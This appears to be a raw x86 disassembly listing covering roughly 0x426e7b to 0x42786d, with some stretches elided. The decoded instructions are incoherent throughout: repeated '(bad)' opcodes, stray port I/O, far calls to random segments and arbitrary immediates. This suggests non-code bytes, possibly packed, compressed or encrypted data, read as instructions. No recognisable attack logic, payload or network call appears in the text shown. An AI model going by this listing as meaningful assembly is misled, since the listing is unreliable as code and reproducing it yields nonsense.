  426e7b:	jno    0x426e6a
  426e7d:	push   0x24
  426e7f:	(bad)  
  426e81:	arpl   di,ax
  426e83:	mov    bh,0xd3
  426e85:	clc    
  426e86:	mov    al,0x9f
  426e88:	push   cs
  426e89:	pop    ecx
  426e8a:	xchg   esp,eax
  426e8b:	jnp    0x426e67
  426e8d:	add    al,0xe5
  426e8f:	sub    esp,edi
  426e91:	fcom   DWORD PTR [ebx]
  426e93:	and    DWORD PTR [esi-0x2b135486],ecx
  426e99:	aas    
  426e9a:	imul   edi,DWORD PTR [eax-0xcba2077],0xbb8c3229
  426ea4:	push   edi
  426ea5:	inc    edx
  426ea6:	or     al,0xa8
  426ea8:	push   0x2e30fb0f
  426ead:	movntq QWORD PTR [edi+0x2991f0a1],mm0
  426eb4:	lock int3 
  426eb6:	mul    ebx
  426eb8:	aas    
  426eb9:	out    0x3d,eax
  426ebb:	xchg   dl,bh
  426ebd:	stos   BYTE PTR es:[edi],al
  426ebe:	push   edi
  426ebf:	das    
  426ec0:	cmp    DWORD PTR [eax+0x61],edx
  426ec3:	out    dx,al
  426ec4:	in     eax,0x45
  426ec6:	push   ecx
  426ec7:	dec    edx
  426ec8:	sub    al,0x3
  426eca:	popf   
  426ecb:	aam    0x72
  426ecd:	outs   dx,BYTE PTR ds:[esi]
  426ece:	dec    edx
  426ecf:	mov    al,ds:0x677eb9e0
  426ed4:	mov    bh,0x55
  426ed6:	icebp  
  426ed7:	out    0xd5,al
  426ed9:	dec    edi
  426eda:	repz cmp DWORD PTR [ebx],0xe9ded82a
  426ee1:	nop
  426ee2:	mov    ebp,0x93d4b7ff
  426ee7:	dec    ebp
  426ee8:	mov    ebx,DWORD PTR [edx-0x1a]
  426eeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426eec:	nop
  426eed:	mov    eax,0xa8d8c796
  426ef2:	iret   
  426ef3:	jne    0x426e84
  426ef5:	inc    ecx
  426ef6:	add    cl,BYTE PTR [esi+0x291b090a]
  426efc:	or     ebp,DWORD PTR [ebx+ebx*4+0xd]
  426f00:	cld    
  426f01:	and    eax,0x10351433
  426f06:	xor    dh,bh
  426f08:	(bad)  [ebp+0x4a]
  426f0b:	scas   al,BYTE PTR es:[edi]
  426f0c:	aas    
  426f0d:	dec    esp
  426f0e:	imul   ecx,DWORD PTR [esi-0x78bcdaf],0x1
  426f15:	mov    bh,bl
  426f17:	pop    es
  426f18:	inc    esi
  426f19:	jp     0x426f55
  426f1b:	xchg   esp,eax
  426f1c:	fwait
  426f1d:	xor    BYTE PTR [ebp-0x2fc0355d],0xdf
  426f24:	add    DWORD PTR [esi],ecx
  426f26:	jne    0x426f3c
  426f28:	jb     0x426ef6
  426f2a:	mov    ds:0xa36c3899,al
  426f2f:	lods   al,BYTE PTR ds:[esi]
  426f30:	push   es
  426f31:	push   ss
  426f32:	or     dh,al
  426f34:	lock and esi,DWORD PTR [eax+0x69db33a9]
  426f3b:	xchg   esi,eax
  426f3c:	scas   eax,DWORD PTR es:[edi]
  426f3d:	push   edx
  426f3e:	dec    ecx
  426f3f:	pop    ebp
  426f40:	lds    ecx,FWORD PTR [edx+ebp*2]
  426f43:	cmp    BYTE PTR [ecx+0x62],bl
  426f46:	in     eax,dx
  426f47:	(bad)  
  426f48:	adc    ecx,ecx
  426f4a:	cld    
  426f4b:	ss add eax,0xe1d97a90
  426f51:	int    0x50
  426f53:	nop
  426f54:	pop    ebx
  426f55:	push   es
  426f56:	jno    0x426fa7
  426f58:	lds    esp,FWORD PTR [esi]
  426f5a:	int3   
  426f5b:	aaa    
  426f5c:	xlat   BYTE PTR ds:[ebx]
  426f5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f5e:	sbb    eax,0x8de2fb4f
  426f63:	fst    QWORD PTR ds:0xd6a3c4e5
  426f69:	xchg   ecx,eax
  426f6a:	inc    ebp
  426f6b:	loope  0x426f75
  426f6d:	mov    eax,0x0
	...
  426fd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426fd7:	mov    ds:0xf5c7f1c7,al
  426fdc:	mov    dh,0xf7
  426fde:	inc    edi
  426fdf:	inc    ecx
  426fe0:	add    DWORD PTR [ebx+edx*1+0x671be4bb],esp
  426fe7:	mov    ds:0x1000001,al
  426fec:	add    BYTE PTR [eax],al
  426fee:	sbb    esi,DWORD PTR [ebp+0x6ebac116]
  426ff4:	mov    ch,0x84
  426ff6:	imul   esp,DWORD PTR [eax],0x69
  426ff9:	test   al,0x55
  426ffb:	push   ecx
  426ffc:	pop    ebp
  426ffd:	ins    BYTE PTR es:[edi],dx
  426ffe:	inc    edi
  426fff:	mov    ecx,0x7c535d37
  427004:	clc    
  427005:	inc    ecx
  427006:	mov    ds:0xf01f2160,eax
  42700b:	mov    al,0x6d
  42700d:	out    0x65,eax
  42700f:	lock pusha 
  427011:	mov    eax,ds:0x422fcd1
  427016:	mov    eax,0x9f925b72
  42701b:	xor    eax,0xa39c477f
  427020:	shr    edx,cl
  427022:	cmp    dh,BYTE PTR [ebx+0x27]
  427025:	cmp    eax,0x4017550e
  42702a:	cld    
  42702b:	cmc    
  42702c:	add    eax,ecx
  42702e:	sbb    bh,BYTE PTR [esi]
  427030:	push   esi
  427031:	pop    ebp
  427032:	lea    eax,[ebp+0x6d]
  427035:	mov    eax,ds:0x548fb199
  42703a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42703b:	mov    bh,0x4b
  42703d:	or     DWORD PTR [esi+0x7a],edx
  427040:	mov    ecx,0x21e5e597
  427045:	add    BYTE PTR [ecx],ah
  427047:	ins    BYTE PTR es:[edi],dx
  427048:	fisubr WORD PTR [ebp-0x29]
  42704b:	jl     0x427069
  42704d:	(bad)  
  42704e:	mov    eax,0xd72bfdf0
  427053:	jns    0x427093
  427055:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427056:	inc    eax
  427057:	push   ebx
  427058:	adc    eax,ebx
  42705a:	call   0x5d17036f
  42705f:	mov    al,ds:0xa1165329
  427064:	mov    ah,0xed
  427066:	mov    bl,0x59
  427068:	jp     0x42706c
  42706a:	mov    eax,0xe9a88b7b
  42706f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427070:	rcl    DWORD PTR [edx],1
  427072:	iret   
  427073:	sbb    DWORD PTR [ebx-0x585bd85b],edx
  427079:	pop    edx
  42707a:	xchg   ecx,eax
  42707b:	mov    bh,0x6d
  42707d:	ins    DWORD PTR es:[edi],dx
  42707e:	popf   
  42707f:	out    0x54,al
  427081:	arpl   cx,bp
  427083:	pushf  
  427084:	les    esp,FWORD PTR [ecx+0x7d]
  427087:	pop    eax
  427088:	mov    DWORD PTR [edi-0x54],esi
  42708b:	test   esi,esi
  42708d:	push   es
  42708e:	(bad)  
  427090:	push   es
  427091:	rcl    BYTE PTR [ebx],0xeb
  427094:	sub    DWORD PTR ss:[ebx],edi
  427097:	je     0x4270df
  427099:	fwait
  42709a:	cmp    eax,DWORD PTR [ebx+0x78879fb1]
  4270a0:	ret    
  4270a1:	push   edx
  4270a2:	lea    esp,[ebx+esi*2]
  4270a5:	imul   edx,ebp,0xf698c025
  4270ab:	add    BYTE PTR [edi-0x43fc615f],ah
  4270b1:	dec    edi
  4270b2:	in     eax,0x8e
  4270b4:	inc    ebx
  4270b5:	test   BYTE PTR [edx+ecx*8],al
  4270b8:	pushf  
  4270b9:	pcmpeqb mm7,QWORD PTR [esi-0x9e86bc7]
  4270c0:	jo     0x4270bb
  4270c2:	ret    
  4270c3:	or     eax,0x866591c2
  4270c8:	stos   BYTE PTR es:[edi],al
  4270c9:	test   al,0xbf
  4270cb:	imul   esp,DWORD PTR [edx+0x59],0x46
  4270cf:	mov    ch,0x36
  4270d1:	retfw  
  4270d3:	scas   al,BYTE PTR es:[edi]
  4270d4:	or     DWORD PTR [ebx],edi
  4270d6:	xchg   esi,eax
  4270d7:	inc    esi
  4270d8:	jecxz  0x42706b
  4270da:	stos   BYTE PTR es:[edi],al
  4270db:	push   ebp
  4270dc:	jb     0x427110
  4270de:	cmp    eax,0x2c0b4ce2
  4270e3:	inc    esp
  4270e4:	dec    esi
  4270e5:	lock inc ebp
  4270e7:	jns    0x42713f
  4270e9:	mov    ds:0x602ef4b1,al
	...
  427156:	or     al,0x6d
  427158:	sbb    dl,BYTE PTR [ebp-0x2700885]
  42715e:	inc    esp
  42715f:	mov    ebp,0x840f9d96
  427164:	mov    cl,0xa9
  427166:	addr16 mov ds:0x1,eax
  42716a:	add    BYTE PTR [ecx],al
  42716c:	add    BYTE PTR [eax],al
  42716e:	xchg   esp,eax
  42716f:	dec    esi
  427170:	rcr    BYTE PTR [ecx],1
  427172:	or     dh,dl
  427174:	jmp    0x42718a
  427176:	xchg   BYTE PTR [ecx],al
  427178:	outs   dx,DWORD PTR ds:[esi]
  427179:	mov    dh,0x42
  42717b:	push   ds
  42717c:	sub    eax,0xbb2c51dc
  427181:	mov    al,ds:0x6233954d
  427186:	jb     0x427175
  427188:	adc    bl,BYTE PTR [edi+0x196f9aae]
  42718e:	lds    eax,FWORD PTR [esp+edx*8]
  427191:	stc    
  427192:	xchg   ecx,eax
  427193:	xchg   esp,eax
  427194:	popa   
  427195:	loopne 0x42716d
  427197:	test   eax,0x59946a96
  42719c:	int3   
  42719d:	fadd   DWORD PTR [esi]
  42719f:	cld    
  4271a0:	mov    al,ds:0xeebb833f
  4271a5:	push   cs
  4271a6:	ficomp DWORD PTR [edx-0x2]
  4271a9:	sbb    DWORD PTR [eax+0x6384c27f],esp
  4271af:	push   ebp
  4271b0:	lds    esp,FWORD PTR [eax+eax*2+0x5e5991a3]
  4271b7:	mul    BYTE PTR [ecx+0xc]
  4271ba:	(bad)  
  4271bb:	mov    ah,0x61
  4271bd:	push   es
  4271be:	dec    esp
  4271bf:	test   eax,0x84c0584d
  4271c4:	jmp    0x4271bd
  4271c6:	add    eax,0x42ff1f49
  4271cb:	sbb    ecx,ecx
  4271cd:	enter  0xd485,0x42
  4271d1:	add    DWORD PTR [edx+0x37],0x6bdafb69
  4271d8:	jb     0x4271c3
  4271da:	call   0xcff1:0xed1e593b
  4271e1:	cmp    DWORD PTR [esi],edi
  4271e3:	aas    
  4271e4:	or     al,dl
  4271e6:	ins    DWORD PTR es:[edi],dx
  4271e7:	sub    BYTE PTR [ebx-0x1e194785],0xc5
  4271ee:	pop    esp
  4271ef:	and    BYTE PTR [edx+0x21],al
  4271f2:	add    BYTE PTR [eax+ebp*4-0x10],ch
  4271f6:	fisttp DWORD PTR [edx+0x47e35858]
  4271fc:	int3   
  4271fd:	mov    eax,0x7d6128f5
  427202:	retf   
  427203:	inc    esp
  427204:	sbb    al,0x73
  427206:	and    al,0x4e
  427208:	call   0xe6e:0x7c767f14
  42720f:	mov    esp,0xd734d1de
  427214:	fisubr DWORD PTR [ebx+0x7c339ac]
  42721a:	push   0x9c776398
  42721f:	fidiv  DWORD PTR [eax+0x5efb2f3a]
  427225:	jo     0x42723c
  427227:	adc    DWORD PTR [eax-0x75],0x2f8f41d6
  42722e:	stc    
  42722f:	add    BYTE PTR [eax+0x4d4f3bfe],0xeb
  427236:	sub    DWORD PTR [eax+0x63],ecx
  427239:	(bad)  
  42723a:	and    edi,DWORD PTR [eax-0xc2228a3]
  427240:	add    ebx,DWORD PTR [eax]
  427242:	cld    
  427243:	and    al,bh
  427245:	jbe    0x4271e2
  427247:	mov    esp,ss
  427249:	nop
  42724a:	call   FWORD PTR [edx+0x66fb7f7f]
  427250:	mov    ss,WORD PTR [edi*4+0x3ffe05dd]
  427257:	lahf   
  427258:	add    al,0xbe
  42725a:	jo     0x4271f6
  42725c:	retf   0xf0aa
  42725f:	rcr    DWORD PTR [esi],cl
  427261:	popf   
  427262:	fucomip st,st(7)
  427264:	fwait
  427265:	les    edi,FWORD PTR [edx+0x61]
  427268:	sub    eax,edi
  42726a:	(bad)  
  42726b:	rcr    BYTE PTR [ecx+0x76],1
	...
  4272d6:	push   ds
  4272d7:	inc    ecx
  4272d8:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  4272df:	push   ecx
  4272e0:	dec    ebp
  4272e1:	mov    ds:0x4f1a9c4a,al
  4272e6:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4272e8:	add    DWORD PTR [eax],eax
  4272ea:	add    BYTE PTR [ecx],al
  4272ec:	add    BYTE PTR [eax],al
  4272ee:	ins    DWORD PTR es:[edi],dx
  4272ef:	int3   
  4272f0:	aaa    
  4272f1:	stos   BYTE PTR es:[edi],al
  4272f2:	data16 xor dl,al
  4272f5:	retf   0xefed
  4272f8:	mov    ecx,DWORD PTR [ebx-0x3f]
  4272fb:	leave  
  4272fc:	dec    ecx
  4272fd:	xchg   DWORD PTR [eax-0x5bf37c50],ebp
  427303:	mov    DWORD PTR [ecx+ebx*1],0x88d2ebc3
  42730a:	pop    ebx
  42730b:	imul   edi,DWORD PTR [ecx],0x1e
  42730e:	sti    
  42730f:	leave  
  427310:	jb     0x42733b
  427312:	jp     0x427316
  427314:	scas   eax,DWORD PTR es:[edi]
  427315:	mov    al,ds:0xd96beaf7
  42731a:	(bad)  
  42731b:	mov    bl,cl
  42731d:	adc    eax,0x93b58c43
  427322:	dec    edx
  427323:	out    0xcf,al
  427325:	(bad)  
  427326:	cmp    BYTE PTR [ebx+0x70da0556],cl
  42732c:	loope  0x427337
  42732e:	mov    dl,0xb4
  427330:	pop    ebx
  427331:	ret    0x5f0f
  427334:	repnz cmp edx,DWORD PTR [edx-0x721353e0]
  42733b:	lea    edx,[eax-0x50]
  42733e:	sub    edi,DWORD PTR [esi+0x5ab0eefe]
  427344:	iret   
  427345:	inc    eax
  427346:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427347:	mov    esi,ebx
  427349:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42734a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42734b:	xlat   BYTE PTR ds:[ebx]
  42734c:	imul   edx,DWORD PTR [eax+eiz*2-0x14],0xa7507d9a
  427354:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427355:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427356:	(bad)  
  427358:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427359:	cli    
  42735a:	outs   dx,BYTE PTR ds:[esi]
  42735b:	jg     0x427344
  42735d:	or     al,0x10
  42735f:	xchg   ebx,eax
  427360:	dec    eax
  427361:	lods   eax,DWORD PTR ds:[esi]
  427362:	sbb    dh,BYTE PTR [eax-0x2b]
  427365:	popf   
  427366:	jge    0x4273be
  427368:	push   ss
  427369:	adc    al,0xa8
  42736b:	inc    ecx
  42736c:	fcomi  st,st(3)
  42736e:	mov    ecx,0xa97d1664
  427373:	or     eax,DWORD PTR [eax+0x9]
  427376:	push   edx
  427377:	cmp    DWORD PTR [edx],0x44
  42737a:	bound  ecx,QWORD PTR [edi-0x7d]
  42737d:	mov    esp,0x17d3fed9
  427382:	jmp    0x4273e4
  427384:	dec    ebx
  427385:	or     esp,ebx
  427387:	xchg   esi,eax
  427388:	loopne 0x4273ef
  42738a:	daa    
  42738b:	xor    DWORD PTR [esp+ebp*2+0x33],0x297ffe8f
  427393:	push   ds
  427394:	inc    ecx
  427395:	and    ch,BYTE PTR [eax+0x153828be]
  42739b:	iret   
  42739c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42739d:	and    esi,ecx
  42739f:	cmp    eax,0x9aabd952
  4273a4:	fldenv ds:0x1d063b75
  4273aa:	inc    ecx
  4273ab:	arpl   WORD PTR [edi],cx
  4273ad:	test   al,0xa8
  4273af:	inc    edi
  4273b0:	cld    
  4273b1:	adc    esp,DWORD PTR [ebx+esi*8]
  4273b4:	inc    esp
  4273b5:	jl     0x42741b
  4273b7:	adc    ebx,DWORD PTR [eax+ebx*1-0x7e]
  4273bb:	push   0xffffffcb
  4273bd:	sub    al,0x3d
  4273bf:	in     al,0x94
  4273c1:	into   
  4273c2:	data16 lahf 
  4273c4:	or     esp,DWORD PTR [ebp+0x1eee05e7]
  4273ca:	jecxz  0x42736f
  4273cc:	mov    bl,0x72
  4273ce:	in     eax,dx
  4273cf:	and    eax,0x75a6a2d3
  4273d4:	mov    dl,0x93
  4273d6:	dec    ebp
  4273d7:	retf   0x320e
  4273da:	icebp  
  4273db:	lds    edi,FWORD PTR [edi]
  4273dd:	push   esp
  4273de:	out    dx,eax
  4273df:	push   ss
  4273e0:	jnp    0x427453
  4273e2:	not    DWORD PTR [ecx]
  4273e4:	push   ecx
  4273e5:	pop    edi
  4273e6:	xchg   ebx,eax
  4273e7:	outs   dx,BYTE PTR ds:[esi]
  4273e8:	mov    edx,0x217be840
  4273ed:	or     eax,DWORD PTR [eax]
	...
  427453:	add    BYTE PTR [eax],al
  427455:	add    BYTE PTR [edx],dl
  427457:	sbb    eax,0xaf3f8832
  42745c:	mov    edx,0x29f0389f
  427461:	sbb    edx,ecx
  427463:	das    
  427464:	and    dl,BYTE PTR [ebp+0x1a567]
  42746a:	add    BYTE PTR [ecx],al
  42746c:	add    BYTE PTR [eax],al
  42746e:	stos   DWORD PTR es:[edi],eax
  42746f:	(bad)
  427472:	stos   BYTE PTR es:[edi],al
  427473:	arpl   WORD PTR [ebx-0x23],ax
  427476:	aaa    
  427477:	scas   eax,DWORD PTR es:[edi]
  427478:	add    eax,0x15834d78
  42747d:	jg     0x4274ad
  42747f:	in     eax,dx
  427480:	mov    ebp,0xec15db
  427485:	(bad)  [eax+ebp*2+0x1369c14]
  42748c:	imul   BYTE PTR [edx]
  42748e:	ja     0x427419
  427490:	adc    ecx,esi
  427492:	and    ebx,DWORD PTR ds:0x2c39dc85
  427498:	add    al,0xfb
  42749a:	sahf   
  42749b:	jne    0x427500
  42749d:	popf   
  42749e:	js     0x42744d
  4274a0:	fild   WORD PTR [ebx]
  4274a2:	int3   
  4274a3:	push   eax
  4274a4:	adc    ebx,ecx
  4274a6:	add    BYTE PTR [edi+0x15],0xe5
  4274aa:	add    bl,BYTE PTR [ecx]
  4274ac:	mov    ds:0xedbc726a,eax
  4274b1:	dec    ebx
  4274b2:	add    bl,bl
  4274b4:	popf   
  4274b5:	adc    al,bh
  4274b7:	scas   eax,DWORD PTR es:[edi]
  4274b8:	mov    esi,0xbe4dba19
  4274be:	mov    dl,0x94
  4274c0:	loopne 0x42751d
  4274c2:	dec    esi
  4274c3:	dec    al
  4274c5:	nop
  4274c6:	les    esi,FWORD PTR [edx-0x11]
  4274c9:	inc    ecx
  4274ca:	retf   
  4274cb:	cli    
  4274cc:	xor    ah,BYTE PTR [edi-0x5e]
  4274cf:	mov    ds:0x371f8871,eax
  4274d4:	jne    0x42752a
  4274d6:	out    dx,eax
  4274d7:	mov    edi,0xbe624a73
  4274dc:	icebp  
  4274dd:	(bad)  
  4274de:	xchg   ecx,eax
  4274df:	rol    BYTE PTR [ecx-0x21d3d04],1
  4274e5:	ss or  al,0xfc
  4274e8:	icebp  
  4274e9:	out    dx,al
  4274ea:	(bad)  
  4274eb:	mov    esi,0xd5a9ccf1
  4274f0:	sub    dh,BYTE PTR [ebx+0x4a21c215]
  4274f6:	sbb    DWORD PTR [esi+0x48dd4414],0xffffff9c
  4274fd:	and    eax,esi
  4274ff:	jecxz  0x427576
  427501:	mov    esi,DWORD PTR [edi+ecx*1-0x6b]
  427505:	dec    edi
  427506:	adc    eax,0x53fdf18c
  42750b:	sub    al,0x50
  42750d:	xchg   esi,eax
  42750e:	icebp  
  42750f:	dec    edi
  427510:	ror    ah,cl
  427512:	scas   al,BYTE PTR es:[edi]
  427513:	arpl   WORD PTR [esi+esi*2+0x2585fe0b],di
  42751a:	sahf   
  42751b:	or     BYTE PTR [ebp-0x732f79fb],cl
  427521:	scas   eax,DWORD PTR es:[edi]
  427522:	fstp   TBYTE PTR [eax+0x22]
  427525:	mov    cl,0x1a
  427527:	mov    esp,0xa8f3a22a
  42752c:	jg     0x427545
  42752e:	shl    BYTE PTR [esi],0x67
  427531:	aaa    
  427532:	xor    dh,BYTE PTR [ebx+0x792e0630]
  427538:	push   edx
  427539:	sbb    BYTE PTR [bp+di+0x28],dl
  42753d:	pop    ds
  42753e:	sti    
  42753f:	push   esi
  427540:	call   0xa836:0xc49e2c0
  427547:	fiadd  DWORD PTR [ebx]
  427549:	mov    cl,0x49
  42754b:	and    edx,ebx
  42754d:	add    al,0xb1
  42754f:	mul    DWORD PTR [ecx]
  427551:	dec    eax
  427552:	stc    
  427553:	dec    ecx
  427554:	ficom  DWORD PTR [ecx+0x3a]
  427557:	ins    DWORD PTR es:[edi],dx
  427558:	loopne 0x4275d3
  42755a:	xor    DWORD PTR [ecx-0x21],0xf351b2
  427561:	jne    0x4275c4
  427563:	push   edi
  427564:	rsqrtps xmm6,XMMWORD PTR [eax+0x0]
  427568:	cwde   
  427569:	xchg   ebp,eax
  42756a:	mov    ecx,DWORD PTR [ebp+0xaa78]
	...
  4275d4:	add    BYTE PTR [eax],al
  4275d6:	pop    esp
  4275d7:	test   al,0xc0
  4275d9:	stos   DWORD PTR es:[edi],eax
  4275da:	hlt    
  4275db:	jmp    0x42765c
  4275dd:	(bad)  
  4275de:	cmp    dh,BYTE PTR [esi]
  4275e0:	jbe    0x42764c
  4275e2:	mov    dh,0x64
  4275e4:	mul    BYTE PTR [bx-0x5a]
  4275e8:	add    DWORD PTR [eax],eax
  4275ea:	add    BYTE PTR [ecx],al
  4275ec:	add    BYTE PTR [eax],al
  4275ee:	cmp    eax,eax
  4275f0:	xor    BYTE PTR [ecx-0x9],ah
  4275f3:	call   0xdee6:0x7edbef7
  4275fa:	inc    eax
  4275fb:	loop   0x42760a
  4275fd:	add    al,0x1
  4275ff:	adc    eax,0xd7cef606
  427604:	fs out dx,al
  427606:	sub    al,0xde
  427608:	pop    ss
  427609:	add    BYTE PTR [eax+0x6055c70c],bh
  42760f:	add    eax,0x9eeec2ec
  427614:	mov    eax,ds:0x8342b92f
  427619:	xchg   ecx,eax
  42761a:	stc    
  42761b:	sub    ch,dh
  42761d:	mov    ebx,0xaa482278
  427622:	jnp    0x427600
  427624:	pop    ebp
  427625:	push   esp
  427626:	pushf  
  427627:	mov    BYTE PTR [edx+0x7fc6566e],dl
  42762d:	retf   
  42762e:	xchg   edi,eax
  42762f:	sub    dh,BYTE PTR [eax-0x7a1e4f7]
  427635:	js     0x427657
  427637:	das    
  427638:	sub    bh,BYTE PTR [edx]
  42763a:	pop    ebx
  42763b:	mov    ebx,0x8a3c07f8
  427640:	sub    bl,BYTE PTR [edx]
  427642:	push   es
  427643:	loopne 0x4275cc
  427645:	outs   dx,BYTE PTR ds:[esi]
  427646:	mov    ch,al
  427648:	cld    
  427649:	test   eax,0x54400771
  42764e:	loopne 0x427678
  427650:	mov    bh,0x25
  427652:	push   ss
  427653:	cwde   
  427654:	add    ecx,DWORD PTR ds:0xff1d298a
  42765a:	scas   al,BYTE PTR es:[edi]
  42765b:	and    DWORD PTR [edx],eax
  42765d:	mov    ebp,0xfb935209
  427662:	retf   
  427663:	xchg   edx,eax
  427664:	stos   DWORD PTR es:[edi],eax
  427665:	add    eax,ecx
  427667:	loop   0x4276a6
  427669:	mov    cl,0xe
  42766b:	(bad)  
  42766d:	jae    0x4276e9
  42766f:	je     0x4276e3
  427671:	dec    edx
  427672:	clc    
  427673:	adc    ch,BYTE PTR [ebx+edx*2+0x5baca93e]
  42767a:	dec    esp
  42767b:	and    esp,eax
  42767d:	fnstenv [ebp+eiz*4-0x16]
  427681:	add    ecx,eax
  427683:	lahf   
  427684:	lock xor ecx,DWORD PTR [ecx+0x67]
  427688:	xor    BYTE PTR [esi+eiz*1],bl
  42768b:	sub    bh,BYTE PTR [edx-0x7a]
  42768e:	std    
  42768f:	rep stos BYTE PTR es:[edi],al
  427691:	and    dh,al
  427693:	xor    edx,DWORD PTR [edx]
  427695:	iret   
  427696:	int    0x6
  427698:	das    
  427699:	mov    bl,0x9b
  42769b:	pop    di
  42769d:	inc    edx
  42769e:	outs   dx,BYTE PTR ds:[esi]
  42769f:	or     BYTE PTR [ebx-0x34],0xe0
  4276a3:	cli    
  4276a4:	jbe    0x427706
  4276a6:	push   esi
  4276a7:	stos   DWORD PTR es:[edi],eax
  4276a8:	fwait
  4276a9:	cmp    ch,BYTE PTR [esi-0x5677e388]
  4276af:	push   ds
  4276b0:	xlat   BYTE PTR ds:[ebx]
  4276b1:	mov    ecx,DWORD PTR [edi]
  4276b3:	jp     0x427720
  4276b5:	rcl    BYTE PTR [ebx-0x52],cl
  4276b8:	cmp    eax,0x7782e3bc
  4276bd:	mov    al,0x2c
  4276bf:	mov    fs,edi
  4276c1:	jnp    0x427690
  4276c3:	cli    
  4276c4:	shl    BYTE PTR [eax-0x4311f2d5],0x71
  4276cb:	fimul  DWORD PTR [esi-0x62581678]
  4276d1:	dec    ebp
  4276d2:	xchg   ecx,eax
  4276d3:	imul   esp,DWORD PTR [edi+edi*1-0x5a2837bc],0x990362b6
  4276de:	sbb    al,0x71
  4276e0:	xchg   esp,eax
  4276e1:	add    DWORD PTR ss:[edx-0x7c3c6526],edx
  4276e8:	mov    esi,0x40c9a7d8
  4276ed:	mov    eax,0x0
	...
  427756:	add    DWORD PTR [esi-0x70],edx
  427759:	out    dx,al
  42775a:	xlat   BYTE PTR ds:[ebx]
  42775b:	out    dx,al
  42775c:	jg     0x42775d
  42775e:	in     al,dx
  42775f:	xor    al,0x86
  427761:	fldenv [edi]
  427763:	cwde   
  427764:	dec    ebp
  427765:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427766:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  427768:	add    DWORD PTR [eax],eax
  42776a:	add    BYTE PTR [ecx],al
  42776c:	add    BYTE PTR [eax],al
  42776e:	add    cl,bh
  427770:	inc    esi
  427771:	dec    ebp
  427772:	mov    gs,WORD PTR [edi]
  427774:	test   DWORD PTR [edx+edx*4-0x727423c9],eax
  42777b:	pop    edi
  42777c:	popa   
  42777d:	(bad)
  427781:	jne    0x4277a2
  427783:	jl     0x42774b
  427785:	xchg   ebp,eax
  427786:	cmp    BYTE PTR [ecx],al
  427788:	cld    
  427789:	call   edx
  42778b:	aaa    
  42778c:	xor    DWORD PTR [ebp+0x22],0xe
  427790:	cmp    ebp,DWORD PTR [eax]
  427792:	mov    eax,0xa022587
  427797:	pop    edi
  427798:	test   al,0x8c
  42779a:	dec    edx
  42779b:	inc    esi
  42779c:	jns    0x42778d
  42779e:	pop    esp
  42779f:	jl     0x4277cf
  4277a1:	or     bh,BYTE PTR [esp+ecx*1+0x4aa6c2dc]
  4277a8:	xchg   esp,eax
  4277a9:	fstp   TBYTE PTR [edi]
  4277ac:	retf   
  4277ad:	sub    al,BYTE PTR [ebp-0xb]
  4277b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4277b1:	retf   
  4277b2:	jnp    0x427783
  4277b4:	(bad)  
  4277b5:	loopne 0x4277d6
  4277b7:	outs   dx,BYTE PTR ds:[esi]
  4277b8:	push   edi
  4277b9:	adc    DWORD PTR [ebx-0x68f6ea03],esp
  4277bf:	xchg   esi,eax
  4277c0:	mov    edi,0xb7a38a0
  4277c5:	and    bl,BYTE PTR [ecx+eax*8+0x30]
  4277c9:	adc    BYTE PTR [ebp-0x10],0xe0
  4277cd:	dec    esi
  4277ce:	(bad)  
  4277cf:	arpl   WORD PTR [ecx-0x72],ax
  4277d2:	jnp    0x427777
  4277d4:	call   0x8665:0xc99c62d5
  4277db:	stos   BYTE PTR es:[edi],al
  4277dc:	aad    0x6f
  4277de:	adc    BYTE PTR [ebx-0x5560bb04],ch
  4277e4:	int    0x6b
  4277e6:	sub    DWORD PTR [edx],edx
  4277e8:	or     al,0xf1
  4277ea:	or     ah,BYTE PTR [edi-0x31da3fdc]
  4277f0:	retf   0x6d79
  4277f3:	fpatan 
  4277f5:	sub    edi,DWORD PTR [ecx]
  4277f7:	push   edi
  4277f8:	mov    WORD PTR [ebp+0x78],gs
  4277fb:	mov    al,0x22
  4277fd:	idiv   DWORD PTR [ebx]
  4277ff:	mov    bl,0xcd
  427801:	inc    esp
  427802:	(bad)  
  427803:	jl     0x4277fc
  427805:	xor    eax,0xc25e802c
  42780a:	and    eax,0xd37631f5
  42780f:	push   0xeb818523
  427814:	ins    BYTE PTR es:[edi],dx
  427815:	add    eax,0x71b1004f
  42781a:	xchg   edx,eax
  42781b:	std    
  42781c:	or     al,0x99
  42781e:	fcomp  QWORD PTR [ecx]
  427820:	push   edi
  427821:	sbb    DWORD PTR [edi-0x3b],ecx
  427824:	adc    edx,0x937869fb
  42782a:	inc    ebx
  42782b:	call   0x3e387c44
  427830:	ffreep st(0)
  427832:	or     BYTE PTR ds:0x59fbddc7,dh
  427838:	clc    
  427839:	mov    ch,0xcc
  42783b:	or     dl,BYTE PTR [ebp+0x14]
  42783e:	in     eax,0xf1
  427840:	or     BYTE PTR [eax-0x35c9211f],bh
  427846:	ins    DWORD PTR es:[edi],dx
  427847:	sub    ebp,esi
  427849:	loopne 0x4277d1
  42784b:	push   esp
  42784c:	leave  
  42784d:	ins    BYTE PTR es:[edi],dx
  42784e:	jne    0x42788f
  427850:	mov    dh,0x5b
  427852:	add    edi,esi
  427854:	(bad)  [edi+0x6b]
  427857:	mov    al,0x1d
  427859:	jge    0x4278ab
  42785b:	(bad)  
  42785c:	mov    ebx,0x9a22ee10
  427861:	out    dx,eax
  427862:	js     0x4278e1
  427864:	pushf  
  427865:	mov    cl,0xc
  427867:	xchg   esp,eax
  427868:	jae    0x42782e
  42786a:	inc    edi
  42786b:	and    eax,edx
  42786d:	add    BYTE PTR gs:[eax],al
